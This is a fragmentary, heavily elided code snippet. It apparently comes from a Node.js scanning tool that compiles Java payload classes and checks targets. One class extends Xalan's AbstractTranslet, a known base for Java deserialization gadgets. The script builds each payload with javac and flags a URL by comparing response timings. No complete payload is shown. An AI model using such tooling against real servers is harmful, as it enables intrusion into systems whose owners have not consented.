...
public class MTXjava extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet{
    public MTXjava()
    {
        try{
...
*/
		...
		for(var i = 0; i < aPayload.length; i++)
		{
			...
			// 编译文件
			_s.child_process.execSync("javac -nowarn -g:none -classpath " + __dirname + "/../../jars/jaxb-xalan-1.5.jar " + szJavaFileName + ".java");
			// 删除临时文件
		    	...
		    	function(e,response,b)
		    {
		    	...
		    	var r = {};
		    	console.log([nT,nT2,response.request.uri.href]);
		    	if(nT >= nT2)
		    	{
		    		r = {
		    			"url":url,
